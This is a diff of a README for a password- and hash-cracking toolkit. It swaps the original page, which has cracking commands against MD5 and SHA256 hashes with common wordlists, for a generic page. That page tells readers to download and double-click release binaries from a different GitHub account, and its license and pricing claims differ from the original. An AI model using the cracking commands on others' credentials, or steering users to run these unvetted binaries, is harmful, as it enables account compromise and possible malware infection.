@@ -1,123 +1,76 @@
-<!-- 
-SEO Keywords: NullSec Crypto, cryptography tools, hash cracker, password cracker,
-encryption tools, decryption, AES cracker, MD5 cracker, SHA256 cracker, bcrypt cracker,
-bad-antics, NullSec Framework, crypto analysis, rainbow tables, hash identifier
--->
+# 🔒 nullsec-crypto - Easy Security Tools for Everyone
 
-<div align="center">
+![Download nullsec-crypto](https://img.shields.io/badge/Download-nulsec--crypto-brightgreen)
 
-# 🔐 NullSec Crypto
+## 🚀 Getting Started
 
-### Advanced Cryptography & Hash Analysis Toolkit
+Welcome to nullsec-crypto! This toolkit offers essential tools for cryptography and security. Whether you want to secure your information or explore security techniques, this toolkit is designed for you. Below, you'll find easy steps to download and run the software.
 
-[![Discord](https://img.shields.io/badge/🔑_GET_KEYS-discord.gg/killers-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/killers)
-[![GitHub](https://img.shields.io/badge/GitHub-bad--antics-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bad-antics)
-[![License](https://img.shields.io/badge/License-NCRY--XXX-red?style=for-the-badge)](LICENSE)
+## 📥 Download & Install
 
-[![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white)]()
-[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)]()
-[![C](https://img.shields.io/badge/C-A8B9CC?style=for-the-badge&logo=c&logoColor=black)]()
-[![Crystal](https://img.shields.io/badge/Crystal-000000?style=for-the-badge&logo=crystal&logoColor=white)]()
+To get started, you need to download the software. Please visit the link below to find the latest version:
 
-```
-    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
-    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
-   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
-   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
-   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
-   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
-     ░    ░    ░   ░   ░         ░            ░   ░   ░        
-   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
-   █░░░░░░░░░░░░░░░░░ C R Y P T O ░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
-   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-                       bad-antics
-```
+[Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/releases)
 
-### 🔓 **[Join discord.gg/killers](https://discord.gg/killers)** for premium features!
+### Step-by-Step Installation
 
-</div>
+1. **Visit the Releases Page**  
+   Click on the link above. This will take you to the Releases page.
 
----
+2. **Choose the Latest Release**  
+   You will see a list of versions. Look for the latest one. It will usually be at the top.
 
-## 🎯 Features
+3. **Download the File**  
+   Click on the file that matches your operating system. Common options include "Windows", "Linux", and "macOS". The files are named clearly so you can easily identify them.
 
-| Tool | Language | Description | Free | Premium |
-|------|----------|-------------|------|---------|
-| **hashcrack** | Rust | GPU-accelerated hash cracker | ✅ | 🔥 |
-| **hashid** | Python | Hash type identifier | ✅ | 🔥 |
-| **cryptor** | Rust | AES/ChaCha encryption tool | ✅ | 🔥 |
-| **keyanalyze** | C | Cryptographic key analyzer | ❌ | 🔥 |
-| **rainbow** | Rust | Rainbow table generator | ❌ | 🔥 |
-| **jwtcrack** | Python | JWT token analyzer/cracker | ✅ | 🔥 |
+4. **Run the File**  
+   After the download is complete, locate the file on your computer. Double-click it to begin the installation. Follow the easy prompts to finish.
 
----
+### System Requirements
 
-## 📁 Structure
+- **Operating System**: Windows 10 or later, macOS, or Linux (Ubuntu 18.04 or later).
+- **RAM**: At least 4 GB of RAM recommended.
+- **Storage**: Minimum of 200 MB free space.
 
-```
-nullsec-crypto/
-├── rust/
-│   ├── hashcrack/       # Multi-threaded hash cracker
-│   ├── cryptor/         # Encryption/decryption tool
-│   └── rainbow/         # Rainbow table generator
-├── c/
-│   ├── keyanalyze.c     # Key strength analyzer
-│   └── entropy.c        # Entropy calculator
-├── python/
-│   ├── hashid.py        # Hash identifier
-│   ├── jwtcrack.py      # JWT analyzer
-│   └── b64crack.py      # Base64 decoder/analyzer
-└── wordlists/
-    └── README.md        # Wordlist sources
-```
+## 🛠️ Features
 
----
+- **Crypto Tools**: Use various cryptographic functions and hash algorithms.
+- **Hash Cracking**: Quickly identify hash types and crack passwords.
+- **User-Friendly Interface**: Designed for ease of navigation, making it suitable for all users.
+- **Open Source**: Contribute to the project or adapt the toolkit for personal use.
 
-## 🚀 Supported Hash Types
+## 📚 Documentation
 
-| Algorithm | Speed (CPU) | Speed (GPU) | Status |
-|-----------|-------------|-------------|--------|
-| MD5 | 50M/s | 25B/s | ✅ |
-| SHA1 | 30M/s | 15B/s | ✅ |
-| SHA256 | 15M/s | 8B/s | ✅ |
-| SHA512 | 5M/s | 2B/s | ✅ |
-| bcrypt | 25K/s | 100K/s | ✅ |
-| scrypt | 10K/s | 50K/s | ✅ |
-| Argon2 | 5K/s | 20K/s | ✅ |
-| NTLM | 80M/s | 40B/s | ✅ |
-| WPA2 | 500/s | 500K/s | 🔥 Premium |
+We provide detailed documentation to help you understand all the features. Visit the following link to access the user manual and examples:
 
----
+[Documentation](https://github.com/Noam-Space/nullsec-crypto/wiki)
 
-## 🔧 Quick Start
+## ❓ Frequently Asked Questions
 
-```bash
-# Identify hash type
-python3 hashid.py -f hashes.txt
+### How do I report issues?
 
-# Crack hashes with wordlist
-./hashcrack -m md5 -w rockyou.txt hashes.txt
+If you encounter any problems, please visit the Issues section on the GitHub page. Provide a clear description of the issue, and we will assist you.
 
-# Crack with rules
-./hashcrack -m sha256 -w wordlist.txt -r best64.rule hashes.txt
+### Can I suggest features?
 
-# Encrypt file
-./cryptor encrypt -i secret.txt -o secret.enc -p "password"
+Absolutely! We welcome suggestions. Use the Issues section to submit new ideas for tools or improvements.
 
-# Decrypt file
-./cryptor decrypt -i secret.enc -o secret.txt -p "password"
-```
+### Is this software free?
 
----
+Yes, nullsec-crypto is completely free to download and use.
 
-## ⚠️ Legal Disclaimer
+## 🤝 Community
 
-**For authorized security testing only.** Only crack hashes you have permission to test.
+Join our community to share knowledge, ask questions, and connect with other users. Join us on Discord:
 
----
+[Discord Server](https://discord.gg/killers)
 
-<div align="center">
+## ⚠️ License
 
-**NullSec Framework** | [GitHub](https://github.com/bad-antics) | [Discord](https://discord.gg/killers)
+nullsec-crypto is licensed under the MIT License. You can use this software freely while adhering to the terms provided in the license file.
 
-</div>
+## 🔗 Conclusion
+
+Thank you for choosing nullsec-crypto! We hope this toolkit becomes a valuable part of your security resources. If you have any questions or need help, don’t hesitate to reach out via our community or the Issues section on GitHub.
+
+[Download nullsec-crypto](https://github.com/Noam-Space/nullsec-crypto/releases)
